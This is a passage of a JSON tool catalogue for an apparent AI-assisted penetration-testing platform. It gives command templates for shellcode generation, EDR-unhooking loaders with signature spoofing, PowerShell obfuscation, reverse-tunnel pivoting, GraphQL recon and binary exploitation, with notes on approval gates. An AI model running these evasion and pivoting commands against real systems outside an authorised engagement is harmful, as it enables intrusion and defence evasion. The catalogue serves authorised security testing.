      "purpose": "Converts a PE, .NET assembly, DLL or VBS/JS file into position-independent shellcode a loader can run from memory (T1620), so the payload never has to land on disk as an executable. Generation only: the output is a file until a human approves a separate step that runs it. Its sandbox-image install lands in a later task of this build.",
      "phases": [
        "exploitation",
        "post-exploitation"
      ],
      "techniques": [
        "shellcode generation",
        "in-memory execution",
        "reflective loading",
        "T1620"
      ],
      "docs": "https://github.com/TheWover/donut",
      "templates": [
        {
          "label": "PE / .NET assembly to shellcode",
          "template": "donut -i <file> -o <output>",
          "note": "Emits position-independent shellcode. Feeding it to a loader is its own approved step — donut itself only writes a file."
        },
        {
          "label": "Shellcode for a specific architecture",
          "template": "donut -i <file> -a 2 -o <output>",
          "note": "-a 1 = x86, 2 = amd64, 3 = dual-mode. Match the host you will run on."
        }
      ],
      "flags": [
        {
          "flag": "-i",
          "what": "input PE / .NET assembly / DLL / VBS / JS"
        },
        {
          "flag": "-o",
          "what": "output shellcode file"
        },
        {
          "flag": "-a",
          "what": "architecture: 1 x86, 2 amd64, 3 both"
        },
        {
          "flag": "-c",
          "what": ".NET class name"
        },
        {
          "flag": "-m",
          "what": ".NET method name"
        },
        {
          "flag": "-p",
          "what": "parameters passed to the entry point"
        }
      ]
    },
    {
      "name": "ScareCrow",
      "category": "evasion",
      "purpose": "Loader generator that wraps shellcode in a Windows artifact and restores clean copies of ntdll/kernel32 before running it, so userland API hooking sees nothing (T1620 / T1027.002). Cross-compiles from Linux. HackPit only GENERATES the artifact; delivering or running it is a separate, separately-approved step. Its sandbox-image install lands in a later task of this build.",
      "phases": [
        "exploitation",
        "post-exploitation"
      ],
      "techniques": [
        "loader generation",
        "EDR unhooking",
        "software packing",
        "T1027.002",
        "T1620"
      ],
      "docs": "https://github.com/optiv/ScareCrow",
      "templates": [
        {
          "label": "Loader from raw shellcode",
          "template": "ScareCrow -I <file> -Loader binary",
          "note": "-I takes raw shellcode (donut output, for instance). -Loader picks the artifact type: binary, dll, cpl, xll, msiexec, control, js, hta, wscript. The result is a file on disk, nothing more."
        }
      ],
      "flags": [
        {
          "flag": "-I",
          "what": "raw shellcode input file"
        },
        {
          "flag": "-Loader",
          "what": "artifact type: binary, dll, cpl, xll, msiexec, ..."
        },
        {
          "flag": "-domain",
          "what": "domain whose code-signing identity the artifact spoofs"
        },
        {
          "flag": "-O",
          "what": "output artifact name"
        }
      ]
    },
    {
      "name": "Invoke-Obfuscation",
      "platform": "windows",
      "category": "evasion",
      "purpose": "PowerShell obfuscation framework (T1027.010) — token, string, encoding and launcher-level rewrites of a script or command, used to test whether script-block logging, AMSI and signature-based detection still fire once a payload is transformed. Windows/PowerShell host only: it cannot run on the Linux sandbox, and is catalogued so HackPit can help PLAN and WRITE UP that work rather than implying it is runnable here.",
      "phases": [
        "post-exploitation"
      ],
      "techniques": [
        "PowerShell obfuscation",
        "command obfuscation",
        "AMSI/logging evasion",
        "T1027.010"
      ],
      "docs": "https://github.com/danielbohannon/Invoke-Obfuscation",
      "templates": [
        {
          "label": "Obfuscate a script non-interactively",
          "template": "Invoke-Obfuscation -ScriptPath <file> -Command \"Token\\All\\1\" -Quiet",
          "note": "Runs on a Windows PowerShell host — deliberately NOT installed in the Linux image. -Command replays the interactive menu path; Token\\All\\1 applies every token-level transform."
        }
      ],
      "flags": [
        {
          "flag": "-ScriptPath",
          "what": "the .ps1 to obfuscate (-ScriptBlock for inline code)"
        },
        {
          "flag": "-Command",
          "what": "menu path to replay non-interactively"
        },
        {
          "flag": "-Quiet",
          "what": "suppress the banner and menu output"
        },
        {
          "flag": "-NoExit",
          "what": "stay in the console after the command runs"
        }
      ]
    },
    {
      "name": "chisel",
      "category": "pivoting",
      "purpose": "TCP/UDP tunnel over HTTP, secured with SSH — a single Go binary that is both server and client. The standard way to turn one compromised host into a route: an agent on that host dials back to a server here, and a SOCKS5 proxy appears on this box that proxychains then points at. HackPit already starts chisel listeners through the GATED /cockpit/tunnels endpoint (human-approved, engagement required); this row exists so the planner writes the invocation the same way every time.",
      "phases": [
        "post-exploitation"
      ],
      "techniques": [
        "pivoting",
        "reverse SOCKS proxy",
        "port forwarding",
        "T1090.001"
      ],
      "docs": "https://github.com/jpillora/chisel",
      "templates": [
        {
          "label": "Reverse SOCKS server (attacker side)",
          "template": "chisel server -p <listener-port> --reverse --socks5",
          "note": "Runs HERE and waits. --reverse lets the agent request the forward; --socks5 publishes the SOCKS5 endpoint on 127.0.0.1:1080. This is the exact argv cockpit/tunnels.py builds — start it through /cockpit/tunnels so the listener is tracked and gated, not by hand."
        },
        {
          "label": "Agent side (runs ON the compromised host)",
          "template": "chisel client <listener>:<listener-port> R:socks",
          "note": "NOT run here — this is the line you paste into the foothold shell. R: makes it a REVERSE forward, so the pivot host dials out to you and needs no inbound port of its own. <listener> is your callback address, never the target."
        },
        {
          "label": "Agent side — forward one internal service instead of a whole SOCKS proxy",
          "template": "chisel client <listener>:<listener-port> R:<local-port>:<target>:<ports>",
          "note": "Quieter than R:socks: exposes exactly one internal service on <local-port> here. Prefer it when you already know the single service you need."
        }
      ],
      "flags": [
        {
          "flag": "server",
          "what": "run as the server (the attacker side)"
        },
        {
          "flag": "client",
          "what": "run as the agent (the compromised side)"
        },
        {
          "flag": "-p",
          "what": "port the server listens on"
        },
        {
          "flag": "--reverse",
          "what": "allow the client to request reverse forwards (R:)"
        },
        {
          "flag": "--socks5",
          "what": "expose a SOCKS5 endpoint for the reverse tunnel"
        },
        {
          "flag": "--fingerprint",
          "what": "pin the server key so the agent cannot be MITM'd"
        }
      ]
    },
    {
      "name": "ligolo-ng",
      "aliases": ["ligolo-proxy", "ligolo-agent"],
      "category": "pivoting",
      "purpose": "Tunnel that presents the pivoted network as a real TUN INTERFACE rather than a SOCKS proxy — ordinary tools reach it over an OS route with no proxychains wrapper, and protocols SOCKS cannot carry (ICMP, UDP, raw SYN scans) work. ligolo-proxy is the attacker-side console; ligolo-agent runs on the compromised host. HackPit starts the proxy through the GATED /cockpit/tunnels endpoint.",
      "phases": [
        "post-exploitation"
      ],
      "techniques": [
        "pivoting",
        "TUN interface tunnel",
        "layer-3 pivot",
        "T1090.001"
      ],
      "docs": "https://github.com/nicocha30/ligolo-ng",
      "templates": [
        {
          "label": "Start the proxy (attacker side)",
          "template": "ligolo-proxy -selfcert -laddr <listener>:<listener-port>",
          "note": "An INTERACTIVE console — it needs a held stdin, which is why cockpit/lifecycle.py spawns it with `-i`. -selfcert is lab-grade only; on a real engagement pin a certificate instead."
        },
        {
          "label": "Agent side (runs ON the compromised host)",
          "template": "ligolo-agent -connect <listener>:<listener-port> -ignore-cert",
          "note": "NOT run here. -ignore-cert pairs with -selfcert above; drop both once you issue a real certificate."
        },
        {
          "label": "Route the pivoted subnet into the TUN interface",
          "template": "ip route add <cidr> dev <interface>",
          "note": "The step people forget: without this route nothing reaches the far side. <interface> is the ligolo tun device. Add the same CIDR to the engagement scope via /cockpit/tunnels/scope — the ONLY path that widens scope."
        }
      ],
      "flags": [
        {
          "flag": "-selfcert",
          "what": "proxy: generate a self-signed certificate (lab only)"
        },
        {
          "flag": "-laddr",
          "what": "proxy: address:port the agent connects back to"
        },
        {
          "flag": "-connect",
          "what": "agent: the proxy address to dial"
        },
        {
          "flag": "-ignore-cert",
          "what": "agent: accept the proxy's self-signed certificate"
        }
      ]
    },
    {
      "name": "socat",
      "category": "pivoting",
      "purpose": "Bidirectional byte relay. In a pivot it is the RETURN path: two hops deep the far host cannot reach your box at all, so a relay on the intermediate host gives its callback somewhere local to land and forwards it back to you. Also the plainest way to expose one internal service from a host you already own.",
      "phases": [
        "post-exploitation"
      ],
      "techniques": [
        "relay",
        "port forwarding",
        "reverse-shell return path",
        "T1090"
      ],
      "docs": "http://www.dest-unreach.org/socat/doc/socat.html",
      "templates": [
        {
          "label": "Relay a callback back to your listener",
          "template": "socat TCP-LISTEN:<local-port>,fork,reuseaddr TCP:<listener>:<listener-port>",
          "note": "Runs on the INTERMEDIATE host. The deeper host connects to it on <local-port>; socat forwards to your listener. fork accepts more than one connection; reuseaddr lets you restart without waiting out TIME_WAIT."
        },
        {
          "label": "Expose one internal service from a host you already own",
          "template": "socat TCP-LISTEN:<local-port>,fork,reuseaddr TCP:<target>:<ports>",
          "note": "A forward port-forward. It leaves a LISTENING PORT on the compromised host, which a defender's netstat shows — the quiet variant is in the KB entry 'Choosing the Pivot Primitive'."
        }
      ],
      "flags": [
        {
          "flag": "TCP-LISTEN:<port>",
          "what": "bind and accept on this port"
        },
        {
          "flag": "fork",
          "what": "handle more than one connection instead of exiting"
        },
        {
          "flag": "reuseaddr",
          "what": "rebind immediately after a restart"
        },
        {
          "flag": "TCP:<host>:<port>",
          "what": "the far side of the relay"
        }
      ]
    },
    {
      "name": "sshuttle",
      "category": "pivoting",
      "purpose": "Transparent VPN-over-SSH: forwards whole subnets through an SSH session with no agent on the far host and no proxychains wrapper — it needs only SSH credentials and Python on the pivot. The lowest-effort pivot when you already have SSH; it moves arbitrary traffic into a network, so it demands the same confirm any tunnel does.",
      "phases": [
        "post-exploitation"
      ],
      "techniques": [
        "pivoting",
        "VPN over SSH",
        "subnet forwarding",
        "T1090.001"
      ],
      "docs": "https://sshuttle.readthedocs.io/",
      "templates": [
        {
          "label": "Forward an internal subnet over an SSH session",
          "template": "sshuttle -r <user>@<target> <cidr>",
          "note": "No listener and no uploaded binary — just SSH plus Python on the pivot. Add <cidr> to the engagement scope via /cockpit/tunnels/scope first: routing a subnet you have not scoped is exactly what the scope lock exists to stop."
        },
        {
          "label": "Key-based, excluding the pivot's own address",
          "template": "sshuttle -r <user>@<target> --ssh-cmd \"ssh -i <keyfile>\" <cidr> -x <target>",
          "note": "-x excludes the pivot itself; without it the SSH session tries to route through the tunnel it is carrying and the connection dies."
        }
      ],
      "flags": [
        {
          "flag": "-r",
          "what": "user@host of the SSH pivot"
        },
        {
          "flag": "--ssh-cmd",
          "what": "the ssh invocation to use (key, port, options)"
        },
        {
          "flag": "-x",
          "what": "exclude an address from the tunnel (use it on the pivot itself)"
        },
        {
          "flag": "--dns",
          "what": "also forward DNS through the pivot"
        }
      ]
    },
    {
      "name": "proxychains",
      "aliases": ["proxychains4"],
      "category": "pivoting",
      "purpose": "LD_PRELOAD wrapper that forces another program's TCP connections through a SOCKS proxy — the CONSUMER of a chisel tunnel, not a tunnel itself. It carries no payload of its own, so the red-confirm it deserves is whatever the WRAPPED command deserves: the danger heuristic unwraps it and classifies the inner command instead.",
      "phases": [
        "post-exploitation",
        "enumeration"
      ],
      "techniques": [
        "SOCKS proxying",
        "pivoted enumeration",
        "T1090"
      ],
      "docs": "https://github.com/rofl0r/proxychains-ng",
      "templates": [
        {
          "label": "Scan through the tunnel",
          "template": "proxychains -q nmap -sT -Pn -p <ports> <target>",
          "note": "-sT and -Pn are NOT optional over SOCKS: a SOCKS proxy carries completed TCP connections only, so a SYN scan (-sS) and ICMP host discovery both silently return nothing. -q suppresses proxychains' own per-connection chatter."
        },
        {
          "label": "Reach an internal web service through the tunnel",
          "template": "proxychains -q curl -s -o <output> <url>",
          "note": "Point the config at the tunnel's SOCKS port first: `socks5 127.0.0.1 <socks-port>` at the END of /etc/proxychains4.conf. One line PER HOP, and the order of the lines is the order of the chain."
        }
      ],
      "flags": [
        {
          "flag": "-q",
          "what": "quiet — suppress the per-connection proxy chatter"
        },
        {
          "flag": "-f",
          "what": "use a specific config file instead of the default"
        }
      ]
    },
    {
        "name": "graphw00f",
        "category": "web",
        "purpose": "Fingerprint WHICH GraphQL engine is behind an endpoint (Apollo, Graphene, Hasura, graphql-java, Ariadne and around two dozen more) by the way each one mangles deliberately malformed queries. The engine decides which of the known GraphQL weaknesses even apply.",
        "phases": [
          "recon",
          "enumeration"
        ],
        "techniques": [
          "GraphQL engine fingerprinting",
          "GraphQL endpoint discovery",
          "error-message oracle"
        ],
        "docs": "https://github.com/dolevf/graphw00f",
        "templates": [
          {
            "label": "Detect and fingerprint one endpoint",
            "template": "graphw00f -f -d -t <endpoint>",
            "note": "-d detects that GraphQL is there, -f fingerprints the engine. Run it first: it is the cheapest request you will send."
          },
          {
            "label": "Find the endpoint first, then fingerprint",
            "template": "graphw00f -d -t <url>",
            "note": "Walks a wordlist of conventional GraphQL paths. Worth it because /graphql is a convention, not a rule."
          },
          {
            "label": "Do not follow redirects",
            "template": "graphw00f -r -f -d -t <endpoint>",
            "note": "A 3xx to a login page otherwise fingerprints the LOGIN app rather than the API."
          }
        ],
        "flags": [
          {
            "flag": "-t",
            "what": "target URL"
          },
          {
            "flag": "-d",
            "what": "detect whether the URL is GraphQL at all"
          },
          {
            "flag": "-f",
            "what": "fingerprint the engine"
          },
          {
            "flag": "-r",
            "what": "do not follow redirects"
          },
          {
            "flag": "-o",
            "what": "write the result to a file"
          }
        ],
        "notes": "INSTALLED FROM GITHUB, NOT PyPI. The PyPI name `graphw00f` is a defensive placeholder package that does nothing (0.0.1, one release, summary: \"NOT the real tool\") - `pip install graphw00f` gets you a stub that runs and finds nothing. ZAP's own GraphQL add-on already sends fingerprinting probes on every schema import, so for an endpoint you have imported you may have this answer already."
      },
      {
        "name": "graphql-cop",
        "category": "web",
        "purpose": "Audit a GraphQL endpoint against the standard misconfiguration set - introspection left on, alias overloading, query batching, field duplication, deep recursion, GET-based mutations, debug modes, trace headers - and print a curl line that reproduces each finding.",
        "phases": [
          "enumeration",
          "exploitation"
        ],
        "techniques": [
          "GraphQL misconfiguration audit",
          "alias overloading",
          "query batching",
          "introspection detection",
          "denial-of-service surface"
        ],
        "docs": "https://github.com/dolevf/graphql-cop",
        "templates": [
          {
            "label": "Audit an endpoint",
            "template": "graphql-cop -t <endpoint>",
            "note": "Every finding carries a curl_verify line - reproduce before you report."
          },
          {
            "label": "Machine-readable output",
            "template": "graphql-cop -t <endpoint> -o json",
            "note": "One JSON object per check, with severity and impact."
          },
          {
            "label": "Authenticated audit",
            "template": "graphql-cop -t <endpoint> -H '<name>: <token>'",
            "note": "Plenty of APIs allow introspection to authenticated callers only, so the anonymous run under-reports."
          }
        ],
        "flags": [
          {
            "flag": "-t",
            "what": "target URL including the GraphQL path"
          },
          {
            "flag": "-o",
            "what": "output format (json)"
          },
          {
            "flag": "-H",
            "what": "an extra header, repeatable"
          },
          {
            "flag": "-p",
            "what": "route through a proxy"
          },
          {
            "flag": "-d",
            "what": "debug mode"
          }
        ],
        "notes": "INSTALLED FROM GITHUB, NOT PyPI - the PyPI name is a reserved placeholder with no functionality. It EXITS EARLY on a server whose `{__typename}` does not answer with a root type name (Query/QueryRoot/query_root/Root): it raises a bare KeyError rather than saying so, which reads as a broken tool and is not. Several of its checks are denial-of-service SURFACE checks (alias overloading, batching, recursion) - it measures whether the server permits them, and permitting is what it reports."
      },
      {
        "name": "inql",
        "category": "web",
        "purpose": "Pull a GraphQL schema by introspection and generate a ready-to-send query or mutation TEMPLATE for every field in it, arguments already in place - the fastest route from 'there is an endpoint' to 'here are forty requests I can edit'.",
        "phases": [
          "enumeration",
          "exploitation"
        ],
        "techniques": [
          "GraphQL introspection",
          "query/mutation template generation",
          "schema-to-request expansion",
          "type cycle detection"
        ],
        "docs": "https://github.com/doyensec/inql",
        "templates": [
          {
            "label": "Introspect and generate everything",
            "template": "inql -t <endpoint> -o <output>",
            "note": "Writes the schema plus one file per query and per mutation. Those go straight into the repeater's GraphQL mode."
          },
          {
            "label": "From a schema you already have",
            "template": "inql -f <schema-file> -o <output>",
            "note": "For an endpoint with introspection off, where the schema came from somewhere else - docs, a JS bundle, or clairvoyance."
          },
          {
            "label": "Authenticated",
            "template": "inql -t <endpoint> --header Authorization '<token>' -o <output>",
            "note": "--header takes NAME and VALUE as two separate arguments, not one 'Name: value' string."
          },
          {
            "label": "Through the recording proxy",
            "template": "inql -t <endpoint> -p http://127.0.0.1:8090 -o <output>",
            "note": "This is the one worth knowing: routing it through HackPit's ZAP proxy puts every generated operation in the CAPTURE, and the capture is what the active scanner can aim at."
          }
        ],
        "flags": [
          {
            "flag": "-t",
            "what": "target endpoint"
          },
          {
            "flag": "-f",
            "what": "read a schema JSON file instead of introspecting"
          },
          {
            "flag": "--header",
            "what": "header NAME and VALUE, as two arguments"
          },
          {
            "flag": "-p",
            "what": "send through an HTTP proxy"
          },
          {
            "flag": "-o",
            "what": "output directory"
          },
          {
            "flag": "--generate-cycles",
            "what": "find type reference cycles (recursion depth)"
          }
        ],
        "notes": "Generation is ON by default: the flags are --no-generate-schema / --no-generate-queries / --no-generate-html, and there is NO --generate-schema (passing it is an error). The -p route matters because ZAP's own schema import sends its generated operations at the endpoint WITHOUT filing them in the Sites tree - measured - so those cannot be scanned, while anything that goes through the proxy can."
      },
      {
        "name": "clairvoyance",
        "category": "web",
        "purpose": "Recover a GraphQL schema from an endpoint WITH INTROSPECTION DISABLED, by abusing the 'Did you mean ...' field suggestions in the server's own validation errors. The answer to the most common GraphQL dead end.",
        "phases": [
          "enumeration"
        ],
        "techniques": [
          "GraphQL field suggestion enumeration",
          "schema recovery without introspection",
          "error-message oracle"
        ],
        "docs": "https://github.com/nikitastupin/clairvoyance",
        "templates": [
          {
            "label": "Recover a schema with a wordlist",
            "template": "clairvoyance -o <output> -w <wordlist> <endpoint>",
            "note": "The wordlist is the whole game - it can only find names it guesses. Start with the project's own list, then add words from the app's own JS."
          },
          {
            "label": "Authenticated",
            "template": "clairvoyance -o <output> -H 'Authorization: <token>' -w <wordlist> <endpoint>",
            "note": "Suggestions are often richer for an authenticated caller."
          },
          {
            "label": "Slower, for a server that rate-limits",
            "template": "clairvoyance -o <output> -w <wordlist> -c 1 -p slow <endpoint>",
            "note": "-c is concurrency. This is a LOT of requests by design: one candidate field name costs one or more."
          }
        ],
        "flags": [
          {
            "flag": "-o",
            "what": "write the recovered schema JSON here"
          },
          {
            "flag": "-w",
            "what": "wordlist of candidate field names"
          },
          {
            "flag": "-H",
            "what": "an extra header, repeatable"
          },
          {
            "flag": "-c",
            "what": "concurrent requests"
          },
          {
            "flag": "-d",
            "what": "the document/query to start from"
          },
          {
            "flag": "-k",
            "what": "do not verify TLS"
          }
        ],
        "notes": "IT ONLY WORKS WHERE FIELD SUGGESTIONS ARE ON. A server with introspection off AND suggestions off (Apollo's didYouMean disabled) gives it nothing, and it reports an EMPTY SCHEMA rather than an error - read that as 'this defence is complete', not 'there is no schema'. HackPit's own schema probe deliberately does not do this: when the probe answers `disabled`, this is the tool to reach for, as a separate gated command."
      },
    {
      "name": "slither",
      "category": "web3",
      "platform": "cross",
      "purpose": "Solidity static analysis — 90+ detectors for reentrancy, access control, unchecked calls, and arithmetic. The default first pass over any EVM contract set; run it before hand-auditing.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "reentrancy detection",
        "access-control review",
        "arithmetic checks",
        "inheritance/shadowing analysis"
      ],
      "docs": "https://github.com/crytic/slither/wiki",
      "templates": [
        {
          "label": "Full detector run (JSON)",
          "template": "slither <file> --json -",
          "note": "Machine-readable output; HackPit's tool-pass parser turns it into ranked findings."
        },
        {
          "label": "One detector",
          "template": "slither <file> --detect reentrancy-eth",
          "note": "Focus a single class after the entrypoint map points at it."
        }
      ]
    },
    {
      "name": "mythril",
      "category": "web3",
      "platform": "cross",
      "aliases": [
        "myth"
      ],
      "purpose": "Symbolic execution of EVM bytecode — finds SWC-classified vulnerabilities (integer bugs, unprotected calls, delegatecall) by exploring reachable states.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "symbolic execution",
        "SWC classification",
        "state exploration"
      ],
      "docs": "https://mythril-classic.readthedocs.io/",
      "templates": [
        {
          "label": "Analyze a contract (JSON)",
          "template": "myth analyze <file> -o json",
          "note": "Deeper but slower than slither; run on the contracts the flow map flagged."
        }
      ]
    },
    {
      "name": "echidna",
      "category": "web3",
      "platform": "cross",
      "purpose": "Property-based fuzzer for EVM contracts — falsifies invariants (e.g. total supply never exceeds cap) an attacker could break.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "property fuzzing",
        "invariant falsification"
      ],
      "docs": "https://github.com/crytic/echidna",
      "templates": [
        {
          "label": "Fuzz a contract's invariants",
          "template": "echidna <file> --contract <contract> --format json",
          "note": "Write echidna_* invariant functions first; a falsified one is a finding."
        }
      ]
    },
    {
      "name": "foundry",
      "category": "web3",
      "platform": "cross",
      "aliases": [
        "forge",
        "cast"
      ],
      "purpose": "Fast Solidity toolkit — forge builds/tests and runs mainnet-fork PoCs; cast reads and calls contracts from the CLI. The PoC harness that PROVES an EVM finding.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "fork PoC",
        "unit/property testing",
        "on-chain reads/calls"
      ],
      "docs": "https://book.getfoundry.sh/",
      "templates": [
        {
          "label": "Run an exploit test on a fork",
          "template": "forge test --match-test <name> -vvvv --fork-url <url>",
          "note": "The forge PoC template lives in the web3-audit skill; approve-each in the sandbox."
        },
        {
          "label": "Read a contract getter",
          "template": "cast call <target> \"totalSupply()(uint256)\"",
          "note": "Confirm on-chain state without a transaction."
        }
      ]
    },
    {
      "name": "semgrep",
      "category": "web3",
      "platform": "cross",
      "purpose": "Multi-language pattern static analysis. HackPit's :code-scan runs it over any tree; with smart-contract rulesets it also lints Solidity for known bug patterns.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "pattern static analysis",
        "smart-contract rulesets",
        "taint tracking"
      ],
      "docs": "https://semgrep.dev/docs/",
      "templates": [
        {
          "label": "Smart-contract ruleset",
          "template": "semgrep --config p/smart-contracts <path>",
          "note": "Registry rulesets need network; the bundled :code-scan rules do not."
        }
      ]
    },
    {
      "name": "anchor",
      "category": "web3",
      "platform": "cross",
      "aliases": [
        "cargo",
        "clippy"
      ],
      "purpose": "Anchor/Solana build + test framework (with cargo/clippy) — lints Rust programs for unchecked arithmetic and panics, and runs instruction-level PoCs against a local validator.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "Rust lints",
        "account-model review",
        "instruction PoC"
      ],
      "docs": "https://www.anchor-lang.com/",
      "templates": [
        {
          "label": "Clippy arithmetic lints",
          "template": "cargo clippy --all-targets -- -W clippy::arithmetic_side_effects",
          "note": "Surfaces unchecked lamport/amount math before the account review."
        },
        {
          "label": "Run the Anchor test PoC",
          "template": "anchor test",
          "note": "Boots a local validator; a failing invariant test is the PoC."
        }
      ]
    },
    {
      "name": "gosec",
      "category": "web3",
      "platform": "cross",
      "aliases": [
        "go",
        "govet"
      ],
      "purpose": "Go static analysis (with go vet/go test) for Cosmos-SDK chains — surfaces unhandled errors and panic-prone code in ABCI handlers, where a panic is a consensus halt.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "Go static analysis",
        "panic-path review",
        "ABCI halt review"
      ],
      "docs": "https://github.com/securego/gosec",
      "templates": [
        {
          "label": "Scan a module (JSON)",
          "template": "gosec -fmt=json <path>/...",
          "note": "Pair with a manual ABCI-method review for maliciously-triggerable panics."
        }
      ]
    },
    {
      "name": "checksec",
      "category": "binary-re",
      "purpose": "Reports a binary's exploit-mitigation posture — NX, PIE, stack canary, RELRO, Fortify — the first thing that decides the exploitation route.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "mitigation enumeration",
        "binary hardening review"
      ],
      "docs": "https://github.com/slimm609/checksec",
      "templates": [
        {
          "label": "Check one binary",
          "template": "checksec --file=<binary>",
          "note": "Read-only: parses the ELF header, never runs the binary."
        }
      ]
    },
    {
      "name": "objdump",
      "category": "binary-re",
      "purpose": "Disassembler / object inspector from binutils — sections, symbols and Intel or AT&T disassembly of a local object.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "disassembly",
        "static binary analysis"
      ],
      "docs": "https://sourceware.org/binutils/docs/binutils/objdump.html",
      "templates": [
        {
          "label": "Disassemble (Intel)",
          "template": "objdump -d -M intel <binary>",
          "note": "Static disassembly; the file is read, never executed."
        },
        {
          "label": "All headers & sections",
          "template": "objdump -x <binary>",
          "note": "Segments, dynamic symbols and relocations in one view."
        }
      ]
    },
    {
      "name": "readelf",
      "category": "binary-re",
      "purpose": "ELF structure inspector — program and section headers, dynamic entries, relocations and the GOT/PLT layout an exploit needs.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "ELF header analysis",
        "relocation review"
      ],
      "docs": "https://sourceware.org/binutils/docs/binutils/readelf.html",
      "templates": [
        {
          "label": "All ELF headers",
          "template": "readelf -a <binary>",
          "note": "Static: dumps the ELF metadata, does not run the file."
        },
        {
          "label": "Dynamic relocations",
          "template": "readelf -r <binary>",
          "note": "GOT/PLT entries for a ret2plt or GOT-overwrite route."
        }
      ]
    },
    {
      "name": "nm",
      "category": "binary-re",
      "purpose": "Lists the symbols in an object or binary — quickly finds functions like system/win and any un-stripped locals.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "symbol enumeration"
      ],
      "docs": "https://sourceware.org/binutils/docs/binutils/nm.html",
      "templates": [
        {
          "label": "List symbols",
          "template": "nm <binary>",
          "note": "Static; empty on a stripped binary — try the dynamic table instead."
        },
        {
          "label": "Dynamic symbols",
          "template": "nm -D <binary>",
          "note": "Dynamic symbol table — resolves even when locals are stripped."
        }
      ]
    },
    {
      "name": "xxd",
      "category": "binary-re",
      "purpose": "Hex dump and reverse hex dump — inspect a file's raw bytes and craft or patch binary blobs by hand.",
      "phases": [
        "recon",
        "exploitation"
      ],
      "techniques": [
        "hex inspection",
        "binary crafting"
      ],
      "docs": "https://linux.die.net/man/1/xxd",
      "templates": [
        {
          "label": "Hex dump",
          "template": "xxd <file>",
          "note": "Read-only view of the file's raw bytes."
        },
        {
          "label": "Dump a header slice",
          "template": "xxd -l 64 <file>",
          "note": "First 64 bytes — magic bytes / file-type identification."
        }
      ]
    },
    {
      "name": "nasm",
      "category": "binary-re",
      "purpose": "The Netwide Assembler — assemble hand-written shellcode or stubs to raw bytes for a pwn payload.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "shellcode assembly"
      ],
      "docs": "https://www.nasm.us/docs.php",
      "templates": [
        {
          "label": "Assemble to an ELF64 object",
          "template": "nasm -f elf64 <file> -o <output>",
          "note": "Assembles a local .asm source into an object; runs nothing."
        },
        {
          "label": "Flat binary (raw shellcode)",
          "template": "nasm -f bin <file> -o <output>",
          "note": "Raw opcodes — pair with objdump -d to read them back."
        }
      ]
    },
    {
      "name": "patchelf",
      "category": "binary-re",
      "purpose": "Reads and REWRITES an ELF's interpreter and RPATH — set a challenge binary's loader and libc so a supplied local libc matches the target's at run time.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "ELF interpreter patching",
        "libc swapping"
      ],
      "docs": "https://github.com/NixOS/patchelf",
      "templates": [
        {
          "label": "Show the interpreter",
          "template": "patchelf --print-interpreter <binary>",
          "note": "Read-only: reports the ELF's dynamic loader path."
        },
        {
          "label": "Set loader and rpath",
          "template": "patchelf --set-interpreter <file> --set-rpath <output> <binary>",
          "note": "MUTATES the local <binary> in place (writes the file). Runs nothing; still approve-each like any command."
        }
      ]
    },
    {
      "name": "ROPgadget",
      "category": "binary-re",
      "purpose": "Finds ROP/JOP gadgets in a binary or libc — the building blocks of a return-oriented payload.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "ROP gadget discovery",
        "return-oriented programming"
      ],
      "docs": "https://github.com/JonathanSalwan/ROPgadget",
      "templates": [
        {
          "label": "All gadgets",
          "template": "ROPgadget --binary <binary>",
          "note": "Static: parses the binary's executable segments."
        },
        {
          "label": "Search a gadget",
          "template": "ROPgadget --binary <binary> --re '<pattern>'",
          "note": "e.g. 'pop rdi' to control the first argument register."
        }
      ]
    },
    {
      "name": "ropper",
      "category": "binary-re",
      "purpose": "ROP-gadget finder and chain builder across architectures — an alternative to ROPgadget with gadget-quality filters.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "ROP gadget discovery",
        "gadget chaining"
      ],
      "docs": "https://github.com/sashs/Ropper",
      "templates": [
        {
          "label": "List gadgets",
          "template": "ropper --file <binary>",
          "note": "Static analysis of the binary's code."
        },
        {
          "label": "Search a gadget",
          "template": "ropper --file <binary> --search '<pattern>'",
          "note": "e.g. 'pop rdi; ret' — the classic arg-loading gadget."
        }
      ]
    },
    {
      "name": "one_gadget",
      "category": "binary-re",
      "purpose": "Finds the one-shot execve(/bin/sh) gadgets in a libc — a single address that pops a shell when its constraints hold.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "one-gadget discovery",
        "libc exploitation"
      ],
      "docs": "https://github.com/david942j/one_gadget",
      "templates": [
        {
          "label": "Find one-gadgets in a libc",
          "template": "one_gadget <libc>",
          "note": "Static scan of the supplied libc.so; prints each address with its register/stack constraints."
        }
      ]
    },
    {
      "name": "pwntools",
      "aliases": [
        "pwn"
      ],
      "category": "binary-re",
      "purpose": "The CTF exploitation framework — process/remote I/O, ELF and ROP helpers, shellcode and cyclic patterns. Drive it from a python3 script.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "exploit development",
        "ROP",
        "overflow / format-string exploitation"
      ],
      "docs": "https://docs.pwntools.com/",
      "templates": [
        {
          "label": "Check protections (pwn CLI)",
          "template": "pwn checksec <binary>",
          "note": "The pwn command-line wrapper — reads the ELF, runs nothing."
        },
        {
          "label": "Exploit skeleton (local process)",
          "template": "/opt/pwntools/venv/bin/python3 -c 'from pwn import *; e = ELF(\"<binary>\"); io = process(e.path); io.interactive()'",
          "note": "A python3 -c skeleton — arbitrary code, so it trips the red-confirm. Swap process() for remote() to hit a challenge host, through the executor."
        }
      ]
    },
    {
      "name": "angr",
      "category": "binary-re",
      "purpose": "Symbolic-execution and binary-analysis framework — solve for the inputs that reach a target state (license checks, crackmes, path constraints).",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "symbolic execution",
        "constraint solving",
